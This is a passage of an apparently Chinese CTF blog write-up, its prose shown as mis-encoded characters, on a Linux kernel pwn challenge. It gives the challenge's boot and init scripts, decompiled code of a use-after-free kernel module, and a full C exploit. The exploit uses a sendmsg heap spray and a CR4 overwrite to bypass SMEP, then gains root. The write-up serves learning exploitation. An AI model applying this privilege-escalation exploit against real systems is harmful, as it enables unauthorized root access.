<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">stty intr ^]</span><br><span class="line">cd `dirname $0`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#x27; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h3 id="0x4-2-init"><a href="#0x4-2-init" class="headerlink" title="0x4.2 init"></a>0x4.2 init</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">echo &quot;IF8gIF9fICAgICAgICAgICAgICAgXyAgICAgICAgICBfICAgICAKfCB8LyAvX19fICBfX18gXyBfXyB8IHwgICAgX18gX3wgfF9fICAKfCAnIC8vIF8gXC8gXyBcICdfIFx8IHwgICAvIF9gIHwgJ18gXCAKfCAuIFwgIF9fLyAgX18vIHwgfCB8IHxfX3wgKF98IHwgfF8pIHwKfF98XF9cX19ffFxfX198X3wgfF98X19fX19cX18sX3xfLl9fLyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK&quot; | base64 -d</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/baby.ko</span><br><span class="line">chmod 644 /dev/baby</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">umount /proc</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>0x4.3 koæ–‡ä»¶</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_0</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// r13</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v3 = v2;</span><br><span class="line">  v4 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">4</span>], <span class="number">6291648LL</span>, <span class="number">16LL</span>);</span><br><span class="line">  copy_from_user(v4, v3, <span class="number">16LL</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24584</span>:</span><br><span class="line">      v12 = *(<span class="keyword">int</span> *)(v4 + <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v12 &lt;= <span class="number">0x1F</span> &amp;&amp; qword_6C0[v12] )</span><br><span class="line">        ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))kfree)();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24585</span>:</span><br><span class="line">      v10 = *(<span class="keyword">int</span> *)(v4 + <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10 &lt;= <span class="number">0x1F</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = qword_6C0[v10];</span><br><span class="line">        <span class="keyword">if</span> ( v11 )</span><br><span class="line">          (*(<span class="keyword">void</span> (__fastcall **)(_QWORD, __int64, __int64))(v11 + <span class="number">64</span>))(*(_QWORD *)(v11 + <span class="number">56</span>), v11, <span class="number">72LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24583</span>:</span><br><span class="line">      v6 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = (<span class="keyword">int</span>)v6;</span><br><span class="line">        <span class="keyword">if</span> ( !qword_6C0[v6] )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( ++v6 == <span class="number">32</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">      &#125;</span><br><span class="line">      v8 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">1</span>], <span class="number">6291648LL</span>, <span class="number">72LL</span>);</span><br><span class="line">      v9 = *(_QWORD *)v4;</span><br><span class="line">      qword_6C0[v7] = v8;</span><br><span class="line">      *(_QWORD *)(v8 + <span class="number">64</span>) = &amp;copy_to_user;</span><br><span class="line">      *(_QWORD *)(v8 + <span class="number">56</span>) = v9;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_4:</span><br><span class="line">  kfree(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°ä¼šç”³è¯·72å­—èŠ‚ï¼Œæ ¹æ®ä¸Šä¸€ç¯‡slubçš„åˆ†æå¯çŸ¥ï¼Œç”³è¯·72å­—èŠ‚çš„è¯å…¶å®ä¼šåˆ†é…ç»™ä½ 96å­—èŠ‚çš„ï¼Œä¹Ÿå°±æ˜¯0x60,ç”³è¯·å®Œåœ¨è¿™ä¸ªå †é‡Œå¡«å…¥ä¸€ä¸ªå‡½æ•°åœ°å€ç„¶ååé¢ä¼šè°ƒç”¨è¿™ä¸ªåœ°å€ï¼Œæ‰€ä»¥å¦‚æœèƒ½è¦†ç›–è¿™ä¸ªåœ°å€å°±èƒ½æ‹¿åˆ°ç¨‹åºæµäº†ï¼Œåé¢freeè¿™ä¸ªå †çš„æ—¶å€™æ²¡æœ‰æ¸…é™¤æŒ‡é’ˆï¼Œå­˜åœ¨uaf,æ‰€ä»¥å¯ä»¥åˆ©ç”¨å †å–·ç”³è¯·å†…æ ¸å †ï¼Œç”³è¯·0x10000è‚¯å®šèƒ½ç”³è¯·åˆ°åˆšæ‰freeçš„å †ï¼Œç„¶åæŠŠé‚£ä¸ªå †çš„å‡½æ•°æŒ‡é’ˆè¦†ç›–å°±å¯ä»¥äº†,è¿™é‡Œé‡‡ç”¨sendmsgè¿›è¡Œå †å–·ã€‚</p>
<h3 id="0x4-4-exp"><a href="#0x4-4-exp" class="headerlink" title="0x4.4 exp"></a>0x4.4 exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">really_addr</span><span class="params">(<span class="keyword">size_t</span> addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> vmlinux_addr+addr-vmlinux_nokaslr_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up_power</span><span class="params">()</span></span>&#123;</span><br><span class="line">    (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))((*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_cred))(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">&#125;input;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6007</span>,&amp;input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6009</span>,&amp;input);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6008</span>,&amp;input);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    input.buf=(<span class="keyword">size_t</span> *)<span class="built_in">malloc</span>(<span class="number">8</span>*<span class="number">12</span>);</span><br><span class="line">    input.idx=<span class="number">0</span>;</span><br><span class="line">    add(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    del(fd);</span><br><span class="line">    vmlinux_addr=input.buf[<span class="number">8</span>]<span class="number">-0x4d4680</span>;</span><br><span class="line">    <span class="keyword">size_t</span> mov_cr4_pop_ret=really_addr(<span class="number">0xffffffff81070790</span>);</span><br><span class="line">    commit_creds=really_addr(<span class="number">0xffffffff810b99d0</span>);</span><br><span class="line">    prepare_kernel_cred=really_addr(<span class="number">0xffffffff810b9d80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">96</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>=</span>&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>=</span>&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> sockfd=socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>);</span><br><span class="line">    ((<span class="keyword">size_t</span> *)buf)[<span class="number">7</span>]=<span class="number">0x6f0</span>;</span><br><span class="line">    ((<span class="keyword">size_t</span> *)buf)[<span class="number">8</span>]=mov_cr4_pop_ret;</span><br><span class="line">    addr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);</span><br><span class="line">    addr.sin_family=AF_INET;</span><br><span class="line">    addr.sin_port=htons(<span class="number">6666</span>);</span><br><span class="line">    msg.msg_control=buf;</span><br><span class="line">    msg.msg_controllen=<span class="number">96</span>;</span><br><span class="line">    msg.msg_name=(<span class="keyword">caddr_t</span>)&amp;addr;</span><br><span class="line">    msg.msg_namelen=<span class="keyword">sizeof</span>(addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++)&#123;</span><br><span class="line">        sendmsg(sockfd,&amp;msg,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cr4:%p/n&quot;</span>,mov_cr4_pop_ret);</span><br><span class="line">    show(fd);</span><br><span class="line">    ((<span class="keyword">size_t</span> *)buf)[<span class="number">8</span>]=(<span class="keyword">size_t</span>)up_power;</span><br><span class="line">    input.idx=<span class="number">1</span>;</span><br><span class="line">    add(fd);</span><br><span class="line">    del(fd);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++)&#123;</span><br><span class="line">        sendmsg(sockfd,&amp;msg,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    show(fd);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]--getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x4-5-sendmsgå †å–·"><a href="#0x4-5-sendmsgå †å–·" class="headerlink" title="0x4.5 sendmsgå †å–·"></a>0x4.5 sendmsgå †å–·</h3><p>å †å–·çš„ç®€å•åŸç†å°±æ˜¯åœ¨ç”¨æˆ·æ€ç”³è¯·nå¤šä¸ªå†…æ ¸å †ç„¶åç„¶åå¡«å…¥æ•°æ®ï¼Œå¦‚æœkoæ–‡ä»¶å­˜åœ¨uafçš„è¯é‚£å°±å¯ä»¥åˆ©ç”¨å †å–·æ‹¿åˆ°è¢«freeæ‰çš„å †ä¿®æ”¹å…¶ä¸­çš„å†…å®¹ï¼Œè¿›è€Œå½±å“ç¨‹åºæ‰§è¡Œã€‚</p>
<p>sendmsgé¦–å…ˆæ¶‰åŠäº†ä¸¤ä¸ªç»“æ„ä½“<code>struct msghdr</code>å’Œ<code>struct sockaddr_in </code>é¦–å…ˆæ˜¯<code>sockaddr_in</code>è®°å½•äº†æ•°æ®åŒ…çš„ç›®çš„åœ°å€å’Œç«¯å£å·ï¼Œç„¶åæŠŠè¿™ä¸ªç»“æ„ä½“çš„åœ°å€èµ‹å€¼ç»™<code>msghdr.msg_name</code>ï¼ŒæŠŠè¿™ä¸ªç»“æ„ä½“çš„å¤§å°èµ‹å€¼ç»™<code>msghdr.msg_namelen</code>,ç„¶åæŠŠè¦å‘é€çš„æ•°æ®åŒ…çš„åœ°å€ç»™<code>msg.msg_control</code>ï¼ŒæŠŠæ•°æ®åŒ…çš„é•¿åº¦ä¼ é€’ç»™<code>msg.msg_controllen</code>,æœ€åè°ƒç”¨sendmsg()å‡½æ•°ï¼Œsendmsgå‡½æ•°çš„å¤§æ¦‚è¿‡ç¨‹å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg,</span><br><span class="line">             struct msghdr *msg_sys, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags,</span><br><span class="line">             struct used_address *used_address,</span><br><span class="line">             <span class="keyword">unsigned</span> <span class="keyword">int</span> allowed_msghdr_flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">compat_msghdr</span> __<span class="title">user</span> *<span class="title">msg_compat</span> =</span></span><br><span class="line">        (struct compat_msghdr __user *)msg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">address</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovstack</span>[<span class="title">UIO_FASTIOV</span>], *<span class="title">iov</span> =</span> iovstack;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ctl[<span class="keyword">sizeof</span>(struct cmsghdr) + <span class="number">20</span>]</span><br><span class="line">                __aligned(<span class="keyword">sizeof</span>(<span class="keyword">__kernel_size_t</span>)); <span class="comment">// åˆ›å»º44å­—èŠ‚çš„æ ˆç¼“å†²åŒºctlï¼Œ20æ˜¯ipv6_pktinfoç»“æ„çš„å¤§å°</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *ctl_buf = ctl; <span class="comment">// ctl_bufæŒ‡å‘æ ˆç¼“å†²åŒºctl</span></span><br><span class="line">    <span class="keyword">int</span> ctl_len;</span><br><span class="line">    <span class="keyword">ssize_t</span> err;</span><br><span class="line"></span><br><span class="line">    msg_sys-&gt;msg_name = &amp;address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (MSG_CMSG_COMPAT &amp; flags)</span><br><span class="line">        err = get_compat_msghdr(msg_sys, msg_compat, <span class="literal">NULL</span>, &amp;iov);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err = copy_msghdr_from_user(msg_sys, msg, <span class="literal">NULL</span>, &amp;iov); <span class="comment">// ç”¨æˆ·æ•°æ®æ‹·è´åˆ°msg_sysï¼Œåªæ‹·è´msghdræ¶ˆæ¯å¤´éƒ¨</span></span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    err = -ENOBUFS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msg_sys-&gt;msg_controllen &gt; INT_MAX) <span class="comment">//å¦‚æœmsg_syså°äºINT_MAXï¼Œå°±æŠŠctl_lenèµ‹å€¼ä¸ºç”¨æˆ·æä¾›çš„msg_controllen</span></span><br><span class="line">        <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">    flags |= (msg_sys-&gt;msg_flags &amp; allowed_msghdr_flags);</span><br><span class="line">    ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">    <span class="keyword">if</span> ((MSG_CMSG_COMPAT &amp; flags) &amp;&amp; ctl_len) &#123;</span><br><span class="line">        err =</span><br><span class="line">            cmsghdr_from_user_compat_to_kern(msg_sys, sock-&gt;sk, ctl,</span><br><span class="line">                             <span class="keyword">sizeof</span>(ctl));</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">        ctl_buf = msg_sys-&gt;msg_control;</span><br><span class="line">        ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctl_len) &#123;</span><br><span class="line">        BUILD_BUG_ON(<span class="keyword">sizeof</span>(struct cmsghdr) !=</span><br><span class="line">                 CMSG_ALIGN(<span class="keyword">sizeof</span>(struct cmsghdr)));</span><br><span class="line">        <span class="keyword">if</span> (ctl_len &gt; <span class="keyword">sizeof</span>(ctl)) &#123;  <span class="comment">//æ³¨æ„ç”¨æˆ·æ•°æ®çš„sizeå¿…é¡»å¤§äº44å­—èŠ‚</span></span><br><span class="line">            ctl_buf = sock_kmalloc(sock-&gt;sk, ctl_len, GFP_KERNEL);<span class="comment">//sock_kmallocæœ€åä¼šè°ƒç”¨kmalloc åˆ†é… ctl_len å¤§å°çš„å †å—</span></span><br><span class="line">            <span class="keyword">if</span> (ctl_buf == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">        &#125;</span><br><span class="line">        err = -EFAULT;</span><br><span class="line">        <span class="comment">/* æ³¨æ„ï¼Œmsg_sys-&gt;msg_controlæ˜¯ç”¨æˆ·å¯æ§çš„ç”¨æˆ·ç¼“å†²åŒºï¼›ctl_lenæ˜¯ç”¨æˆ·å¯æ§çš„é•¿åº¦ã€‚  ç”¨æˆ·æ•°æ®æ‹·è´åˆ°ctl_bufå†…æ ¸ç©ºé—´ã€‚</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(ctl_buf,</span><br><span class="line">                   (<span class="keyword">void</span> __user __force *)msg_sys-&gt;msg_control,</span><br><span class="line">                   ctl_len))</span><br><span class="line">            <span class="keyword">goto</span> out_freectl;</span><br><span class="line">        msg_sys-&gt;msg_control = ctl_buf;</span><br><span class="line">    &#125;</span><br><span class="line">    msg_sys-&gt;msg_flags = flags;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>å¯è§å¦‚æœmsg.msg_controllen&gt;44å°±ä¼šç”³è¯·ä¸€ä¸ªmsg_controllenå¤§å°çš„å †å—ï¼Œç„¶åæŠŠmsg_controlæŒ‡å‘çš„æ•°æ®èµ‹å€¼ç»™åˆšç”³è¯·çš„å †å—ï¼Œå¤šæ¬¡ä½¿ç”¨sendmsgå°±èƒ½è¾¾åˆ°å †å–·çš„ç›®çš„ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/24/%E8%99%8E%E7%AC%A6ctf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/24/%E8%99%8E%E7%AC%A6ctf/" class="post-title-link" itemprop="url">è™ç¬¦ctf</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

